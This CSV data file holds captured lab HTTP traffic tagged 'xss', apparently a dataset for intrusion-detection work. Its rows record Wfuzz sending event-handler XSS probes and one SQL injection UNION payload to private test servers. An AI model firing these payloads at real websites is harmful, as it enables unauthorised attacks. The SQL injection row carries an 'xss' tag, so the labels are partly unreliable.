attack_tag,dst_ip,dst_port,req_body,req_header_Accept,req_header_Content_Length,req_header_Content_Type,req_header_Host,req_header_User_Agent,req_method,req_url,res_body,res_header_Connection,res_header_Content_Length,res_header_Content_Type,res_header_Date,res_header_Response_Code,res_header_Server,src_ip,src_port
xss,192.168.1.3,80,"id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",*/*,89,application/x-www-form-urlencoded,192.168.1.3,Wfuzz/3.1.0,POST,http://192.168.1.3/DVM/vulnerabilities/sqli/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.1.3 Port 80</address> </body></html> ",,273,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 12:04:02 GMT",404,Apache/2.4.52 (Ubuntu),192.168.1.4,55266
xss,192.168.1.39,80,"name=<body draggable=""true"" ondrag=""alert(1)"">test</body>&submit=send",*/*,69,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;body draggable=&quot;true&quot; ondrag=&quot;alert(1)&quot;&gt;test&lt;/body&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,442,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:22 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49404
xss,192.168.1.39,80,"name=<bdo oncontextmenu=""alert(1)"">test</bdo>&submit=send",*/*,57,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;bdo oncontextmenu=&quot;alert(1)&quot;&gt;test&lt;/bdo&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,420,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:21 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49401
xss,192.168.1.39,80,name=<big onblur=alert(1) tabindex=1 id=x></big><input autofocus>&submit=send,*/*,77,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;big onblur=alert(1) tabindex=1 id=x&gt;&lt;/big&gt;&lt;input autofocus&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,436,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:21 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49402
xss,192.168.1.39,80,"name=<blockquote draggable=""true"" ondragstart=""alert(1)"">test</blockquote>&submit=send",*/*,86,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;blockquote draggable=&quot;true&quot; ondragstart=&quot;alert(1)&quot;&gt;test&lt;/blockquote&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,459,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:22 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49403
xss,192.168.1.39,80,"name=<canvas draggable=""true"" ondragleave=""alert(1)"">test</canvas>&submit=send",*/*,78,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;canvas draggable=&quot;true&quot; ondragleave=&quot;alert(1)&quot;&gt;test&lt;/canvas&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,451,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:22 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49405
xss,192.168.1.39,80,"name=<center draggable=""true"" ondrag=""alert(1)"">test</center>&submit=send",*/*,73,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;center draggable=&quot;true&quot; ondrag=&quot;alert(1)&quot;&gt;test&lt;/center&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,446,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:22 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49406
xss,192.168.1.39,80,"name=<code onmousemove=""alert(1)"">test</code>&submit=send",*/*,57,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;code onmousemove=&quot;alert(1)&quot;&gt;test&lt;/code&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,420,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:22 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49407
xss,192.168.1.39,80,"name=<content onbeforecopy=""alert(1)"" contenteditable>test</content>&submit=send",*/*,80,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;content onbeforecopy=&quot;alert(1)&quot; contenteditable&gt;test&lt;/content&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,443,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:23 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49408
xss,192.168.1.39,80,"name=<div draggable=""true"" contenteditable>drag me</div><bdo ondragover=alert(1) contenteditable>drop here</bdo>&submit=send",*/*,124,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;div draggable=&quot;true&quot; contenteditable&gt;drag me&lt;/div&gt;&lt;bdo ondragover=alert(1) contenteditable&gt;drop here&lt;/bdo&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,499,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:24 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49409
xss,192.168.1.39,80,"name=<div draggable=""true"" contenteditable>drag me</div><frame ondragover=alert(1) contenteditable>drop here</frame>&submit=send",*/*,128,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;div draggable=&quot;true&quot; contenteditable&gt;drag me&lt;/div&gt;&lt;frame ondragover=alert(1) contenteditable&gt;drop here&lt;/frame&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,503,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:24 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49410
xss,192.168.1.39,80,"name=<div draggable=""true"" contenteditable>drag me</div><source ondrop=alert(1) contenteditable>drop here</source>&submit=send",*/*,126,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;div draggable=&quot;true&quot; contenteditable&gt;drag me&lt;/div&gt;&lt;source ondrop=alert(1) contenteditable&gt;drop here&lt;/source&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,501,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:24 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49411
xss,192.168.1.39,80,"name=<div draggable=""true"" contenteditable>drag me</div><script ondrop=alert(1) contenteditable>drop here</script>&submit=send",*/*,126,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;div draggable=&quot;true&quot; contenteditable&gt;drag me&lt;/div&gt;&lt;script ondrop=alert(1) contenteditable&gt;drop here&lt;/script&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,501,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:24 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49412
xss,192.168.1.39,80,"name=<dt onmouseover=""alert(1)"">test</dt>&submit=send",*/*,53,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;dt onmouseover=&quot;alert(1)&quot;&gt;test&lt;/dt&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,416,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:24 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49413
xss,192.168.1.39,80,"name=<dt draggable=""true"" ondragend=""alert(1)"">test</dt>&submit=send",*/*,68,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;dt draggable=&quot;true&quot; ondragend=&quot;alert(1)&quot;&gt;test&lt;/dt&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,441,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:24 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49414
xss,192.168.1.39,80,"name=<embed onmouseenter=""alert(1)"">test</embed>&submit=send",*/*,60,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;embed onmouseenter=&quot;alert(1)&quot;&gt;test&lt;/embed&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,423,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:24 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49415
xss,192.168.1.39,80,name=<figcaption id=x tabindex=1 onfocus=alert(1)></figcaption>&submit=send,*/*,75,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;figcaption id=x tabindex=1 onfocus=alert(1)&gt;&lt;/figcaption&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,428,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:24 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49416
xss,192.168.1.39,80,"name=<frameset oncut=""alert(1)"" contenteditable>test</frameset>&submit=send",*/*,75,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;frameset oncut=&quot;alert(1)&quot; contenteditable&gt;test&lt;/frameset&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,438,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:25 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49417
xss,192.168.1.39,80,name=<header onblur=alert(1) tabindex=1 id=x></header><input autofocus>&submit=send,*/*,83,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;header onblur=alert(1) tabindex=1 id=x&gt;&lt;/header&gt;&lt;input autofocus&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,442,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:25 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49418
xss,192.168.1.39,80,"name=<image draggable=""true"" ondragstart=""alert(1)"">test</image>&submit=send",*/*,76,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;image draggable=&quot;true&quot; ondragstart=&quot;alert(1)&quot;&gt;test&lt;/image&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,449,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:25 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49419
xss,192.168.1.39,80,"name=<image onmouseup=""alert(1)"">test</image>&submit=send",*/*,57,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;image onmouseup=&quot;alert(1)&quot;&gt;test&lt;/image&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,420,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:25 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49420
xss,192.168.1.39,80,"name=<ins oncut=""alert(1)"" contenteditable>test</ins>&submit=send",*/*,65,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;ins oncut=&quot;alert(1)&quot; contenteditable&gt;test&lt;/ins&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,428,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:25 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49421
xss,192.168.1.39,80,"name=<ins oncopy=""alert(1)"" contenteditable>test</ins>&submit=send",*/*,66,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;ins oncopy=&quot;alert(1)&quot; contenteditable&gt;test&lt;/ins&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,429,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:25 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49422
xss,192.168.1.39,80,"name=<label onmouseover=""alert(1)"">test</label>&submit=send",*/*,59,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;label onmouseover=&quot;alert(1)&quot;&gt;test&lt;/label&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,422,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:25 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49423
xss,192.168.1.39,80,"name=<link onbeforecut=""alert(1)"" contenteditable>test</link>&submit=send",*/*,73,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;link onbeforecut=&quot;alert(1)&quot; contenteditable&gt;test&lt;/link&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,436,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:25 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49424
xss,192.168.1.39,80,"name=<listing onmouseover=""alert(1)"">test</listing>&submit=send",*/*,63,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;listing onmouseover=&quot;alert(1)&quot;&gt;test&lt;/listing&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,426,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:26 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49425
xss,192.168.1.39,80,"name=<meter oncontextmenu=""alert(1)"">test</meter>&submit=send",*/*,61,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;meter oncontextmenu=&quot;alert(1)&quot;&gt;test&lt;/meter&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,424,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:26 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49426
xss,192.168.1.39,80,name=<noembed onblur=alert(1) tabindex=1 id=x></noembed><input autofocus>&submit=send,*/*,85,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall6/index.php,"your name: &lt;noembed onblur=alert(1) tabindex=1 id=x&gt;&lt;/noembed&gt;&lt;input autofocus&gt; <!DOCTYPE html> <html>         <head>                 <title>Welcome to name changer</title>         </head>         <body>                 <form method=""POST"">                         <input type=""text"" name=""name"" placeholder=""your name here"">    <input type=""submit"" name=""submit"" value=""send"">                 </form>         </body> </html> ",close,444,text/html; charset=UTF-8,"Mon, 30 Jan 2023 22:23:26 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,49427
